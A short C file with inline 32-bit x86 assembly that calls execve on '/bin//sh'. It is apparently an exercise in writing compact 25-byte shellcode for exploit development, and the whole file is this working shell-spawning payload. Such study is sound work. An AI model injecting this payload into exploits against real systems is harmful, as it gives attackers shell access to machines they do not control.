/*
 * build 32 bit(-m32) binary on 64 bit machine
 * assembly : at&t syntax (default)
 *
 * gcc -o asm_optimization_shell_25_atnt asm_optimization_shell_25_atnt.c -m32 -mpreferred-stack-boundary=2
 */
void main()
{
	__asm__(
	"xor %eax, %eax;"
	"push %eax;"
	"push $0x68732f2f;"
	"push $0x6e69622f;"
	"mov %esp, %ebx;"
	"push %eax;"
	"push %ebx;"
	"mov %esp, %ecx;"
	"mov %eax, %edx;"
	"mov $0xb, %al;"
	"int $0x80;"
	);
}
